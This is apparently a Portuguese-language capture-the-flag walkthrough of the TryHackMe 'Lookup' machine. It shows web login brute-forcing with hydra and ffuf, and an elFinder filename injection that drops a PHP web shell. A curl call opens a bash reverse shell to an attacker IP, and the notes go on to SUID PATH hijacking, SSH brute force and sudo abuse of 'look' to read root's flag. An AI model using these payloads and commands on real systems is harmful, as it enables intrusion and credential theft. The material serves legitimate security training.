## nmap

└─$ nmap -T4 10.66.132.113
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-29 06:38 -0400
Nmap scan report for 10.66.132.113 (10.66.132.113)
Host is up (0.14s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 2.57 seconds

## teste ssh

permite login com user e senha

## http

acessar o / faz um redirect

└─$ nmap -sV -sC -p80 10.66.132.113 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-29 06:41 -0400
Nmap scan report for 10.66.132.113 (10.66.132.113)
Host is up (0.14s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://lookup.thm

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.21 seconds

## gobuster
sem sucesso

─$ gobuster dir -u http://10.66.132.113 -w /usr/share/wordlists/dirb/common.txt -x php,txt,html 
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.66.132.113
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              php,txt,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.hta                 (Status: 403) [Size: 278]
.hta.txt             (Status: 403) [Size: 278]
.hta.php             (Status: 403) [Size: 278]
.hta.html            (Status: 403) [Size: 278]
.htaccess            (Status: 403) [Size: 278]
.htaccess.php        (Status: 403) [Size: 278]
.htpasswd            (Status: 403) [Size: 278]
.htaccess.txt        (Status: 403) [Size: 278]
.htaccess.html       (Status: 403) [Size: 278]
.htpasswd.php        (Status: 403) [Size: 278]
.htpasswd.txt        (Status: 403) [Size: 278]
.htpasswd.html       (Status: 403) [Size: 278]
index.php            (Status: 302) [Size: 0] [--> http://lookup.thm]
index.php            (Status: 302) [Size: 0] [--> http://lookup.thm]
server-status        (Status: 403) [Size: 278]
Progress: 18452 / 18452 (100.00%)
===============================================================
Finished
===============================================================

enumerar o lookup.thm

└─$ gobuster dir -u http://lookup.thm -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://lookup.thm
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              html,php,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
Progress: 0 / 1 (0.00%)
2026/10/29 06:52:02 error on running gobuster on http://lookup.thm/: timeout occurred during the request

inserido no /etc/hosts

10.66.132.113 lookup.thm

enumerar com o gobuster


└─$ gobuster dir -u http://lookup.thm -w /usr/share/wordlists/dirb/common.txt -x php,txt,html

===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://lookup.thm
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              php,txt,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.hta                 (Status: 403) [Size: 275]
.hta.html            (Status: 403) [Size: 275]
.hta.php             (Status: 403) [Size: 275]
.hta.txt             (Status: 403) [Size: 275]
.htaccess            (Status: 403) [Size: 275]
.htpasswd.txt        (Status: 403) [Size: 275]
.htaccess.php        (Status: 403) [Size: 275]
.htaccess.txt        (Status: 403) [Size: 275]
.htaccess.html       (Status: 403) [Size: 275]
.htpasswd            (Status: 403) [Size: 275]
.htpasswd.php        (Status: 403) [Size: 275]
.htpasswd.html       (Status: 403) [Size: 275]
index.php            (Status: 200) [Size: 719]
index.php            (Status: 200) [Size: 719]
login.php            (Status: 200) [Size: 1]
server-status        (Status: 403) [Size: 275]
Progress: 18452 / 18452 (100.00%)
===============================================================
Finished
===============================================================


e acessar o http://lookup.thm/index.php funcionam agora
ele faz um post para login.php com o user e senha

## hydra para acessar o login

hydra -l admin -P /usr/share/wordlists/rockyou.txt lookup.thm http-post-form \
  "/login.php:username=^USER^&password=^PASS^:F=Wrong username or password" \
  -t 4 -f -V

Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-10-29 07:09:33
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
[DATA] attacking http-post-form://lookup.thm:80/login.php:username=^USER^&password=^PASS^:F=Wrong username or password
[ATTEMPT] target lookup.thm - login "admin" - pass "123456" - 1 of 14344399 [child 0] (0/0)
[ATTEMPT] target lookup.thm - login "admin" - pass "12345" - 2 of 14344399 [child 1] (0/0)
[ATTEMPT] target lookup.thm - login "admin" - pass "123456789" - 3 of 14344399 [child 2] (0/0)
[ATTEMPT] target lookup.thm - login "admin" - pass "password" - 4 of 14344399 [child 3] (0/0)
[80][http-post-form] host: lookup.thm   login: admin   password: 123456
[STATUS] attack finished for lookup.thm (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-10-29 07:09:36


NOTA: dever ter sido usado o ffuf para testar vários usuários, foi um chute de sorte.

A mensagem muda pois de fato era admin

ffuf -w /usr/share/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords-10000.txt \
  -X POST -u http://lookup.thm/login.php \
  -d "username=admin&password=FUZZ" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -o ffuf_result.json -of json \
  -t 40

note que para a senha password123 ela da uma mensagem diferente de user e senha inválido, ou seja password123 é a senha de outro user

ffuf -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt \
  -X POST -u http://lookup.thm/login.php \
  -d "username=FUZZ&password=password123" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -o ffuf_users.json -of json \
  -t 40


jose retornou outro status
jose                    [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 137ms]

## files.lookup.thm

o redirect ao colocar a senha é para files.lookup.thm
que deve ser adicionado ao etc/hosts

## elFinder (CVE-2019–9194)

Se fizer o upload de uma imagem jpeg

$(whoami).jpg, o comando whoami é executado

conforme o github
https://github.com/Studio-42/elFinder/issues/2868

Nota: no começo eu fiz com uma imagem png, e não funciona, só funciona com a jpeg, pois o resize e rotate não consege executar na imagem q não é jpeg

é criada uma imagem jpeg e substituida o nome por isso
SecSignal.jpg;echo 3c3f7068702073797374656d28245f4745545b2263225d293b203f3e0a | xxd -r -p > SecSignal.php;echo SecSignal.jpg

então é clicado na opção resize and rotate

## shell reverso

curl "http://files.lookup.thm/elFinder/php/SecSignal.php?c=bash+-c+'bash+-i+>%26+/dev/tcp/192.168.136.167/1234+0>%261'"

└─$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [192.168.136.167] from (UNKNOWN) [10.66.132.113] 35730
bash: cannot set terminal process group (830): Inappropriate ioctl for device
bash: no job control in this shell
<var/www/files.lookup.thm/public_html/elFinder/php$ whoami
whoami
www-data
<var/www/files.lookup.thm/public_html/elFinder/php$ cd /home
cd /home
www-data@ip-10-66-132-113:/home$ ls
ls
ssm-user
think
ubuntu
www-data@ip-10-66-132-113:/home$ cd think
cd think
www-data@ip-10-66-132-113:/home/think$ ls
ls
user.txt
www-data@ip-10-66-132-113:/home/think$ cat user.txt
cat user.txt
cat: user.txt: Permission denied
www-data@ip-10-66-132-113:/home/think$ 

## think password

ls -latr
total 40
-rwxr-xr-x 1 think think  807 Jun  2  2023 .profile
-rwxr-xr-x 1 think think 3771 Jun  2  2023 .bashrc
-rwxr-xr-x 1 think think  220 Jun  2  2023 .bash_logout
lrwxrwxrwx 1 root  root     9 Jun 21  2023 .bash_history -> /dev/null
lrwxrwxrwx 1 root  root     9 Jun 21  2023 .viminfo -> /dev/null
drw-r----- 2 think think 4096 Jun 21  2023 .ssh
drwxr-xr-x 2 think think 4096 Jun 21  2023 .cache
-rw-r----- 1 root  think  525 Jul 30  2023 .passwords
-rw-r----- 1 root  think   33 Jul 30  2023 user.txt
drwx------ 3 think think 4096 Aug  9  2023 .gnupg
drwxr-xr-x 5 think think 4096 Jan 11  2024 .
drwxr-xr-x 5 root  root  4096 Oct 29 10:38 ..


buscar suid

find / -perm -4000 -type f 2>/dev/null

www-data@ip-10-66-132-113:/home/think$ find / -perm -4000 -type f 2>/dev/null
find / -perm -4000 -type f 2>/dev/null
/snap/snapd/19457/usr/lib/snapd/snap-confine
/snap/core20/1950/usr/bin/chfn
/snap/core20/1950/usr/bin/chsh
/snap/core20/1950/usr/bin/gpasswd
/snap/core20/1950/usr/bin/mount
/snap/core20/1950/usr/bin/newgrp
/snap/core20/1950/usr/bin/passwd
/snap/core20/1950/usr/bin/su
/snap/core20/1950/usr/bin/sudo
/snap/core20/1950/usr/bin/umount
/snap/core20/1950/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1950/usr/lib/openssh/ssh-keysign
/snap/core20/1974/usr/bin/chfn
/snap/core20/1974/usr/bin/chsh
/snap/core20/1974/usr/bin/gpasswd
/snap/core20/1974/usr/bin/mount
/snap/core20/1974/usr/bin/newgrp
/snap/core20/1974/usr/bin/passwd
/snap/core20/1974/usr/bin/su
/snap/core20/1974/usr/bin/sudo
/snap/core20/1974/usr/bin/umount
/snap/core20/1974/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1974/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/sbin/pwm
/usr/bin/at
/usr/bin/fusermount
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/mount
/usr/bin/su
/usr/bin/newgrp
/usr/bin/pkexec
/usr/bin/umount

rodando
usr/sbin/pwm
[!] Running 'id' command to extract the username and user ID (UID)
[!] ID: www-data
[-] File /home/www-data/.passwords not found
www-data@ip-10-66-132-113:/home/think$ 

realizar path hijacking
escrever script no tmp
echo -e '#!/bin/bash\necho "uid=1000(think) gid=1000(think) groups=1000(think)"' > /tmp/id

dar permissão de escrita
chmod +x /tmp/id

colocar no path
export PATH=/tmp:$PATH

arquivo de senhas é lido

www-data@ip-10-66-132-113:/home/think$ /usr/sbin/pwm
/usr/sbin/pwm
[!] Running 'id' command to extract the username and user ID (UID)
[!] ID: think
jose1006
jose1004
jose1002
jose1001teles
jose100190
jose10001
jose10.asd
jose10+
jose0_07
jose0990
jose0986$
jose098130443
jose0981
jose0924
jose0923
jose0921
thepassword
jose(1993)
jose'sbabygurl
jose&vane
jose&takie
jose&samantha
jose&pam
jose&jlo
jose&jessica
jose&jessi
josemario.AKA(think)
jose.medina.
jose.mar
jose.luis.24.oct
jose.line
jose.leonardo100
jose.leas.30
jose.ivan
jose.i22
jose.hm
jose.hater
jose.fa
jose.f
jose.dont
jose.d
jose.com}
jose.com
jose.chepe_06
jose.a91
jose.a
jose.96.
jose.9298
jose.2856171
www-data@ip-10-66-132-113:/home/think$ 



# ssh para think

hydra -l think -P think_password.txt ssh://10.66.132.113
Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-10-29 08:21:18
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 49 login tries (l:1/p:49), ~4 tries per task
[DATA] attacking ssh://10.66.132.113:22/
[22][ssh] host: 10.66.132.113   login: think   password: josemario.AKA(think)
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 1 final worker threads did not complete until end.
[ERROR] 1 target did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-10-29 08:21:37


## user flag

ssh think@10.66.132.113
password: josemario.AKA(think)


38375fb4dd8baa2b2039ac03d92b820e

## escalar privilegio

    (ALL) /usr/bin/look

que pode ser usado esse comando do GTFOBins

LFILE=/root/root.txt
look '' "$LFILE"
sudo look '' "$LFILE"

think@ip-10-66-132-113:~$ LFILE=/root/root.txt
think@ip-10-66-132-113:~$ look '' "$LFILE"
look: /root/root.txt: Permission denied
think@ip-10-66-132-113:~$ sudo look '' "$LFILE"
5a285a9f257e45c68bb6c9f9f57d18e8
think@ip-10-66-132-113:~$ 


5a285a9f257e45c68bb6c9f9f57d18e8